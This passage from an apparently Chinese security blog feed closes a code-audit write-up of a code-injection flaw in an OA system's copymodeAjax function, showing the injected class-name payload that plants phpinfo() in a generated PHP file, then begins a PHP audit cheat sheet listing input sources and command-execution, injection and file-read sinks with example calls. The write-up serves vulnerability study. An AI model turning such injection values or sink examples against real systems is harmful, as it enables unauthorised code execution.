class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$from</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>&lt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$fstr</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$from</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">0</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="string">&#x27;flow_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassModel&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="number">1</span>)<span class="variable">$fstr</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$obha</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="string">&#x27;mode_&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;ClassAction&#x27;</span>,<span class="variable">$fstr</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$from</span>, <span class="variable">$to</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ä»£ç ä¸»è¦å‡ºç°åœ¨ä¸Šé¢ï¼Œå¯ä»¥çœ‹åˆ°<code>$bhnu = strtolower(trim($this-&gt;post(&#39;name&#39;)));</code>æ¥æ”¶äº†å¤–éƒ¨è¾“å…¥ï¼Œä¸”åœ¨ä¸‹é¢çš„copyä¸­æœ‰ä½¿ç”¨åˆ°<code>$to</code>ï¼Œè¿™ä¸ªå˜é‡æ˜¯è¾“å…¥ç»è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$to</span>   = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$bhnu</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">createtxt</span>(<span class="variable">$to</span>, <span class="variable">$fstr</span>);</span><br></pre></td></tr></table></figure><p>å¤„ç†çš„ï¼Œè·Ÿè¿›createtxtå‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createtxt</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$txt</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createdir</span>(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$path</span>= <span class="string">&#x27;&#x27;</span>.ROOT_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$path</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">@<span class="variable">$file</span>= <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"><span class="variable">$bo</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="variable">$bo</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$txt</span>)<span class="variable">$bo</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$bo</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯ä»¥ç›´æ¥å†™å…¥æ–‡ä»¶è€Œæ²¡æœ‰è¿‡æ»¤<br>å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼š<code>mode_a&#123;&#125;;phpinfo ();class aAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*æ­¤æ–‡ä»¶æ˜¯æµç¨‹æ¨¡å—ã€gong.é€šçŸ¥å…¬å‘Šã€‘å¯¹åº”æ¥å£æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="comment">*å¯åœ¨é¡µé¢ä¸Šåˆ›å»ºæ›´å¤šæ–¹æ³•å¦‚ï¼špublic funciton testactAjax()ï¼Œç”¨js.getajaxurl(&#x27;testact&#x27;,&#x27;mode_gong|input&#x27;,&#x27;flow&#x27;)è°ƒç”¨åˆ°å¯¹åº”æ–¹æ³•</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mode_a</span></span>&#123;&#125;;<span class="title function_ invoke__">phpinfo</span> ();<span class="class"><span class="keyword">class</span> <span class="title">aClassAction</span> <span class="keyword">extends</span> <span class="title">inputAction</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">savebefore</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">//$uarr[&#x27;receid&#x27;] = $this-&gt;flow-&gt;getreceids($arr[&#x27;receid&#x27;]);</span></span><br><span class="line"><span class="variable">$uarr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;issms&#x27;</span>]))<span class="variable">$uarr</span>[<span class="string">&#x27;issms&#x27;</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;rows&#x27;</span> =&gt; <span class="variable">$uarr</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">saveafter</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$arr</span>, <span class="variable">$id</span>, <span class="variable">$addbo</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æäº¤æŠ•ç¥¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">submittoupiaoAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$mid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mid&#x27;</span>);</span><br><span class="line"><span class="variable">$sid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;sid&#x27;</span>);</span><br><span class="line"><span class="variable">$modenum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;modenum&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;flow= <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow&#x27;</span>)-&gt;<span class="title function_ invoke__">initflow</span>(<span class="variable">$modenum</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$towheer</span>= <span class="string">&quot;`table`=&#x27;infor&#x27; and `mid`=&#x27;<span class="subst">$mid</span>&#x27; and `name`=&#x27;æŠ•ç¥¨&#x27; and `checkid`=&#x27;<span class="subst">$this</span>-&gt;adminid&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;flow-&gt;flogmodel-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$towheer</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;ä½ å·²æŠ•ç¥¨äº†&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;flow-&gt;<span class="title function_ invoke__">addlog</span>(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;æŠ•ç¥¨&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mid&#x27;</span>  =&gt; <span class="variable">$mid</span>,</span><br><span class="line"><span class="string">&#x27;explain&#x27;</span> =&gt; <span class="string">&#x27;æŠ•ç¥¨é¡¹ID(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span> </span><br><span class="line">));</span><br><span class="line"><span class="title function_ invoke__">m</span>(<span class="string">&#x27;infors&#x27;</span>)-&gt;<span class="title function_ invoke__">update</span>(<span class="string">&#x27;`touci`=`touci`+1&#x27;</span>,<span class="string">&#x27;`mid`=&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27; and `id` in(&#x27;</span>.<span class="variable">$sid</span>.<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦åŸå› æ˜¯åœ¨copymodeAjax ä¸­ str_replace æŠŠç±»åæ¢äº† ç„¶å åˆšå¥½payloadå¯ä»¥é—­åˆå‰é¢çš„å†…å®¹ï¼Œå®ç°æ’å…¥ä»£ç </p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘PHPä»£ç å®¡è®¡</title>
      <link href="/2024/10/02/WebSecurity/codeaudit/phpaudit/"/>
      <url>/2024/10/02/WebSecurity/codeaudit/phpaudit/</url>
      
        <content type="html"><![CDATA[<p>PHPä»£ç å®¡è®¡å…¥é—¨æŒ‡å—  <a href="https://www.yuque.com/burpheart/phpaudit/">https://www.yuque.com/burpheart/phpaudit/</a><br>PHP-Audit-Labs <a href="https://github.com/hongriSec/PHP-Audit-Labs?tab=readme-ov-file">https://github.com/hongriSec/PHP-Audit-Labs?tab=readme-ov-file</a></p><h2 id="PHP-ç”¨æˆ·å¯æ§è¾“å…¥"><a href="#PHP-ç”¨æˆ·å¯æ§è¾“å…¥" class="headerlink" title="PHP ç”¨æˆ·å¯æ§è¾“å…¥"></a>PHP ç”¨æˆ·å¯æ§è¾“å…¥</h2><table><thead><tr><th>æ¡†æ¶&#x2F;å…¨å±€å˜é‡</th><th>è·å–URLå‚æ•°ï¼ˆGETï¼‰</th><th>è·å–POSTå‚æ•°</th><th>è·å–ä¸Šä¼ æ–‡ä»¶</th><th>è·å–Cookieå‚æ•°</th><th>è·å–æœåŠ¡å™¨å‚æ•°</th><th>è·å–è¯·æ±‚ä½“</th><th>è·å–JSONæ•°æ®</th><th>æ–‡ä»¶ä¸Šä¼ æ–¹æ³•</th></tr></thead><tbody><tr><td>PHPåŸç”Ÿ</td><td>$_GET</td><td>$_POST</td><td>$_FILES</td><td>$_COOKIE</td><td>$_SERVER</td><td>php:&#x2F;&#x2F;input</td><td>æ— </td><td>æ— </td></tr><tr><td>ThinkPHP5</td><td>Request::instance()-&gt;get(); input(â€˜get.â€™)</td><td>Request::instance()-&gt;post(); input(â€˜post.â€™)</td><td>Request::instance()-&gt;file();</td><td>Request::instance()-&gt;cookie(); input(â€˜cookie.â€™)</td><td>Request::instance()-&gt;server(); input(â€˜server.â€™)</td><td>Request::instance()-&gt;request(); input(â€˜request.â€™)</td><td>Request::instance()-&gt;get(); input(â€˜get.â€™);</td><td>$request-&gt;getJSON();</td></tr><tr><td>ThinkPHP3.*</td><td>I(â€˜get.â€™)</td><td>I(â€˜post.â€™)</td><td>æ— </td><td>æ— </td><td>æ— </td><td>æ— </td><td>æ— </td><td>æ— </td></tr><tr><td>Codeigniter2&#x2F;3</td><td>$this-&gt;input-&gt;get()</td><td>$this-&gt;input-&gt;post()</td><td>$this-&gt;input-&gt;file()</td><td>$this-&gt;input-&gt;cookie()</td><td>$this-&gt;input-&gt;server()</td><td>$this-&gt;input-&gt;post()</td><td>$this-&gt;input-&gt;raw_input_stream</td><td>æ— </td></tr><tr><td>Codeigniter4</td><td>$request-&gt;getGet()</td><td>$request-&gt;getPost()</td><td>$request-&gt;getFiles()</td><td>$request-&gt;getCookie()</td><td>$request-&gt;getServer()</td><td>$request-&gt;getPost(); $request-&gt;getJSON();</td><td>$request-&gt;getJSON()</td><td>$this-&gt;request-&gt;getFiles();</td></tr><tr><td>CakePHP 4.*</td><td>$this-&gt;request-&gt;getQuery(â€˜â€™);</td><td>$this-&gt;request-&gt;getData(â€˜â€™);</td><td>$this-&gt;request-&gt;getUploadedFile(â€˜â€™);</td><td>æ— </td><td>$this-&gt;request-&gt;getServer();</td><td>$this-&gt;request-&gt;getData(â€˜â€™);</td><td>$this-&gt;request-&gt;input(â€˜json_decodeâ€™);</td><td>æ— </td></tr><tr><td>Yii 2.0</td><td>$request-&gt;get();</td><td>$request-&gt;post();</td><td>$request-&gt;getBodyParam(â€˜â€™);</td><td>$request-&gt;getCookies();</td><td>$request-&gt;getHeaders();</td><td>$request-&gt;getBodyParam(â€˜â€™);</td><td>æ— </td><td>æ— </td></tr><tr><td>Laravel</td><td>$request-&gt;query(â€˜â€™);</td><td>$request-&gt;input(â€˜â€™);</td><td>$request-&gt;file(â€˜â€™);</td><td>$request-&gt;cookie(â€˜â€™);</td><td>æ— </td><td>$request-&gt;input(â€˜â€™);</td><td>$request-&gt;json();</td><td>$request-&gt;file(â€˜â€™);</td></tr></tbody></table><h2 id="PHP-æ•æ„Ÿå‡½æ•°"><a href="#PHP-æ•æ„Ÿå‡½æ•°" class="headerlink" title="PHP æ•æ„Ÿå‡½æ•°"></a>PHP æ•æ„Ÿå‡½æ•°</h2><table><thead><tr><th>å‡½æ•°&#x2F;è¯­æ³•</th><th>æè¿°</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>system</td><td>æ‰§è¡Œå‘½ä»¤å¹¶è¾“å‡ºç»“æœ</td><td>system(â€˜idâ€™);</td></tr><tr><td>exec</td><td>æ‰§è¡Œå‘½ä»¤ åªå¯è·å–æœ€åä¸€è¡Œç»“æœ</td><td>exec(â€˜idâ€™, $a); print_r($a);</td></tr><tr><td>passthru</td><td>åŒ system</td><td>passthru(â€˜idâ€™);</td></tr><tr><td>shell_exec</td><td>æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ</td><td>$a&#x3D;shell_exec(â€˜idâ€™); print_r($a);</td></tr><tr><td>&#96; (åå¼•å·)</td><td>æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ</td><td>$a&#x3D;<code>id</code>; print_r($a);</td></tr><tr><td>popen</td><td>æ‰§è¡Œå‘½ä»¤å¹¶å»ºç«‹ç®¡é“ è¿”å›ä¸€ä¸ªæŒ‡é’ˆ ä½¿ç”¨freadç­‰å‡½æ•°æ“ä½œæŒ‡é’ˆè¿›è¡Œè¯»å†™</td><td>$a&#x3D;popen(â€œidâ€, â€œrâ€); echo fread($a, 2096);</td></tr><tr><td>proc_open</td><td>åŒ popen (è¿›ç¨‹æ§åˆ¶åŠŸèƒ½æ›´å¼ºå¤§)</td><td>è§PHPæ‰‹å†Œ</td></tr><tr><td>pcntl_exec</td><td>æ‰§è¡Œå‘½ä»¤ åªè¿”å›æ˜¯å¦å‘ç”Ÿé”™è¯¯</td><td>pcntl_exec(â€˜idâ€™);</td></tr></tbody></table><h2 id="ä»£ç æ³¨å…¥-æ–‡ä»¶åŒ…å«"><a href="#ä»£ç æ³¨å…¥-æ–‡ä»¶åŒ…å«" class="headerlink" title="ä»£ç æ³¨å…¥&#x2F;æ–‡ä»¶åŒ…å«"></a>ä»£ç æ³¨å…¥&#x2F;æ–‡ä»¶åŒ…å«</h2><table><thead><tr><th>å‡½æ•°&#x2F;è¯­æ³•ç»“æ„</th><th>æè¿°</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>eval</td><td>å°†ä¼ å…¥çš„å‚æ•°å†…å®¹ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼Œevalä¸æ˜¯å‡½æ•°ï¼Œæ˜¯ä¸€ç§è¯­æ³•ç»“æ„ï¼Œä¸èƒ½å½“åšå‡½æ•°åŠ¨æ€è°ƒç”¨</td><td><code>eval(&#39;phpinfo();&#39;);</code></td></tr><tr><td>assert</td><td>å°†ä¼ å…¥çš„å‚æ•°å†…å®¹ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHP7ä»¥ä¸‹æ˜¯å‡½æ•°ï¼ŒPHP7åŠä»¥ä¸Šä¸ºè¯­æ³•ç»“æ„</td><td><code>assert(&#39;phpinfo();&#39;);</code></td></tr><tr><td>preg_replace</td><td>å½“<code>preg_replace</code>ä½¿ç”¨&#x2F;eä¿®é¥°ç¬¦ä¸”åŸå­—ç¬¦ä¸²å¯æ§æ—¶ï¼Œæœ‰å¯èƒ½æ‰§è¡ŒPHPä»£ç </td><td><code>echo preg_replace(&quot;/e&quot;,&quot;&#123;$&#123;PHPINFO()&#125;&#125;&quot;,&quot;123&quot;);</code></td></tr><tr><td>call_user_func</td><td>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œä¸¤ä¸ªå‚æ•°éƒ½å®Œå…¨å¯æ§æ—¶å¯åˆ©ç”¨ï¼Œä¼ å…¥ä¸€ä¸ªå‚æ•°è°ƒç”¨</td><td><code>call_user_func(&#39;assert&#39;, &#39;phpinfo();&#39;);</code></td></tr><tr><td>call_user_func_array</td><td>åŒ<code>call_user_func</code>ï¼Œå¯ä¼ å…¥ä¸€ä¸ªæ•°ç»„å¸¦å…¥å¤šä¸ªå‚æ•°è°ƒç”¨å‡½æ•°</td><td><code>call_user_func_array(&#39;file_put_contents&#39;, [&#39;1.txt&#39;,&#39;6666&#39;]);</code></td></tr><tr><td>create_function</td><td>æ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¹¶è¿”å›å”¯ä¸€åç§°ï¼Œåˆ©ç”¨æ—¶ç¬¬äºŒä¸ªå‚æ•°å¯æ§</td><td><code>$f = create_function(&#39;&#39;,&#39;system($_GET[123]);&#39;); $f();</code></td></tr><tr><td>include</td><td>åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ï¼Œæ‰§è¡Œå‡ºé”™ä¼šæŠ›å‡ºé”™è¯¯</td><td><code>include &#39;vars.php&#39;;</code> (æ‹¬å·å¯æœ‰å¯æ— )</td></tr><tr><td>require</td><td>åŒ<code>include</code>ï¼Œæ‰§è¡Œå‡ºé”™ä¼šæŠ›å‡ºè­¦å‘Š</td><td><code>require(&#39;somefile.php&#39;);</code> (æ‹¬å·å¯æœ‰å¯æ— )</td></tr><tr><td>require_once</td><td>åŒ<code>require</code>ï¼Œä½†ä¼šæ£€æŸ¥ä¹‹å‰æ˜¯å¦å·²ç»åŒ…å«è¯¥æ–‡ä»¶ï¼Œç¡®ä¿ä¸é‡å¤åŒ…å«</td><td></td></tr><tr><td>include_once</td><td>åŒ<code>include</code>ï¼Œä½†ä¼šæ£€æŸ¥ä¹‹å‰æ˜¯å¦å·²ç»åŒ…å«è¯¥æ–‡ä»¶ï¼Œç¡®ä¿ä¸é‡å¤åŒ…å«</td><td></td></tr></tbody></table><h2 id="SQL-LDAPæ³¨å…¥"><a href="#SQL-LDAPæ³¨å…¥" class="headerlink" title="SQL&#x2F;LDAPæ³¨å…¥"></a>SQL&#x2F;LDAPæ³¨å…¥</h2><table><thead><tr><th>å‡½æ•°&#x2F;æ–¹æ³•</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>mysql_query</code></td><td></td></tr><tr><td><code>odbc_exec</code></td><td></td></tr><tr><td><code>mysqli_query</code></td><td></td></tr><tr><td><code>mysql_db_query</code></td><td></td></tr><tr><td><code>mysql_unbuffered_query</code></td><td></td></tr><tr><td><code>mysqli::query</code></td><td>ç”¨æ³•ç¤ºä¾‹ï¼š<code>$mysqli = new mysqli(&quot;localhost&quot;, &quot;my_user&quot;, &quot;my_password&quot;, &quot;world&quot;); $mysqli-&gt;query();</code></td></tr><tr><td><code>pg_query</code></td><td></td></tr><tr><td><code>pg_query_params</code></td><td></td></tr><tr><td><code>pg_send_query</code></td><td></td></tr><tr><td><code>pg_send_query_params</code></td><td></td></tr><tr><td><code>sqlsrv_query</code></td><td></td></tr><tr><td><code>pdo::query</code></td><td>ç”¨æ³•ç¤ºä¾‹ï¼š<code>$pdo = new PDO(&quot;mysql:host=localhost;dbname=phpdemo&quot;, &quot;root&quot;, &quot;1234&quot;); $pdo-&gt;query($sql);</code></td></tr><tr><td><code>SQLite3::query</code></td><td></td></tr><tr><td><code>SQLite3::exec</code></td><td>ç”¨æ³•ç¤ºä¾‹ï¼š<code>$db = new SQLite3(&#39;mysqlitedb.db&#39;); $db-&gt;query(&#39;SELECT bar FROM foo&#39;); $db-&gt;exec(&#39;CREATE TABLE bar (bar STRING)&#39;);</code></td></tr><tr><td><code>$mongo = new mongoclient(); $data = $coll-&gt;find($data);</code></td><td>å‚è€ƒï¼š<a href="https://wooyun.js.org/drops/Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.html">MongoDBæ³¨å…¥æ”»å‡»</a></td></tr><tr><td><code>$ld = ldap_connect(&quot;localhost&quot;); $lb = @ldap_bind($ld, &quot;cn=test,dc=test,dc=com&quot;, &quot;test&quot;);</code></td><td>å‚è€ƒï¼š<a href="https://www.cnblogs.com/0nc3/p/12063436.html">LDAPæ³¨å…¥æ”»å‡»</a></td></tr><tr><td><code>Db::query</code></td><td>ThinkPHPæ¡†æ¶</td></tr><tr><td><code>Db::execute</code></td><td>ThinkPHPæ¡†æ¶</td></tr></tbody></table><h2 id="æ–‡ä»¶è¯»å–-SSRF"><a href="#æ–‡ä»¶è¯»å–-SSRF" class="headerlink" title="æ–‡ä»¶è¯»å–&#x2F;SSRF"></a>æ–‡ä»¶è¯»å–&#x2F;SSRF</h2><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td><code>file_get_contents</code></td><td>è¯»å…¥æ–‡ä»¶å¹¶è¿”å›å­—ç¬¦ä¸²</td><td><code>echo file_get_contents(&quot;flag.txt&quot;);</code> <br> <code>echo file_get_contents(&quot;https://www.bilibili.com/&quot;);</code></td></tr><tr><td><code>curl_setopt</code>, <code>curl_exec</code></td><td>Curlè®¿é—®URLè·å–ä¿¡æ¯</td><td><code>function curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); curl_close($ch); &#125; $url = $_GET[&#39;url&#39;]; curl($url);</code></td></tr><tr><td><code>fsockopen</code></td><td>æ‰“å¼€ä¸€ä¸ªå¥—æ¥å­—è¿æ¥ï¼ˆè¿œç¨‹TCP&#x2F;UDP&#x2F;rawï¼‰</td><td><a href="https://www.php.net/manual/zh/function.fsockopen.php">fsockopenå‡½æ•°è¯´æ˜</a></td></tr><tr><td><code>readfile</code></td><td>è¯»å–æ–‡ä»¶å¹¶å†™å…¥è¾“å‡ºç¼“å†²åŒº</td><td>ç±»ä¼¼äº<code>file_get_contents</code>ï¼Œè¯»å–æ–‡ä»¶æµ</td></tr><tr><td><code>fopen</code>, <code>fread</code>, <code>fgets</code>, etc.</td><td>æ‰“å¼€æ–‡ä»¶æˆ–URLå¹¶è¯»å–æ–‡ä»¶æµ</td><td><code>$file = fopen(&quot;test.txt&quot;,&quot;r&quot;); echo fread($file,&quot;1234&quot;); fclose($file);</code></td></tr><tr><td><code>file</code></td><td>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥æ•°ç»„</td><td><code>echo implode(&#39;&#39;, file(&#39;https://www.bilibili.com/&#39;));</code></td></tr><tr><td><code>highlight_file</code>, <code>show_source</code></td><td>è¯­æ³•é«˜äº®æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</td><td><code>highlight_file(&quot;1.php&quot;);</code></td></tr><tr><td><code>parse_ini_file</code></td><td>è¯»å–å¹¶è§£æä¸€ä¸ªinié…ç½®æ–‡ä»¶</td><td><code>print_r(parse_ini_file(&#39;1.ini&#39;));</code></td></tr><tr><td><code>simplexml_load_file</code></td><td>å°†æ–‡ä»¶è¯»å–å¹¶ä½œä¸ºXMLæ–‡æ¡£è§£æ</td><td><code>simplexml_load_file(&#39;test.xml&#39;);</code></td></tr><tr><td><strong><code>stream_socket_client</code></strong></td><td>æ‰“å¼€ä¸€ä¸ªåŸºäºæµçš„å¥—æ¥å­—è¿æ¥ï¼Œç”¨äºæ›´çµæ´»çš„ç½‘ç»œé€šä¿¡</td><td><code>$fp = stream_socket_client(&quot;tcp://example.com:80&quot;, $errno, $errstr, 30);</code></td></tr><tr><td><strong><code>get_headers</code></strong></td><td>è·å–HTTPè¯·æ±‚å¤´ä¿¡æ¯</td><td><code>print_r(get_headers(&quot;https://www.example.com&quot;));</code></td></tr><tr><td><strong><code>file_put_contents</code></strong></td><td>å°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶</td><td><code>file_put_contents(&quot;test.txt&quot;, &quot;data to write&quot;);</code></td></tr><tr><td><strong><code>copy</code></strong></td><td>æ‹·è´æ–‡ä»¶åˆ°å¦ä¸€ä¸ªä½ç½®</td><td><code>copy(&quot;source.txt&quot;, &quot;destination.txt&quot;);</code></td></tr><tr><td><strong><code>move_uploaded_file</code></strong></td><td>å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®</td><td><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;upload_dir/&quot;.$_FILES[&#39;file&#39;][&#39;name&#39;]);</code></td></tr><tr><td><strong><code>parse_url</code></strong></td><td>è§£æURLå¹¶è¿”å›å…¶ç»„æˆéƒ¨åˆ†</td><td><code>$url_components = parse_url(&quot;http://www.example.com/path?query=string&quot;);</code></td></tr><tr><td><strong><code>stream_context_create</code></strong></td><td>åˆ›å»ºå¹¶è®¾ç½®æµä¸Šä¸‹æ–‡ç”¨äºæ–‡ä»¶æˆ–ç½‘ç»œè¿æ¥</td><td><code>$context = stream_context_create([&#39;http&#39; =&gt; [&#39;method&#39; =&gt; &#39;GET&#39;]]); file_get_contents(&quot;https://www.example.com&quot;, false, $context);</code></td></tr></tbody></table><p>è¡¥å……ï¼š</p><ul><li>**<code>stream_socket_client</code>**ï¼šæ¯”<code>fsockopen</code>æ›´åŠ 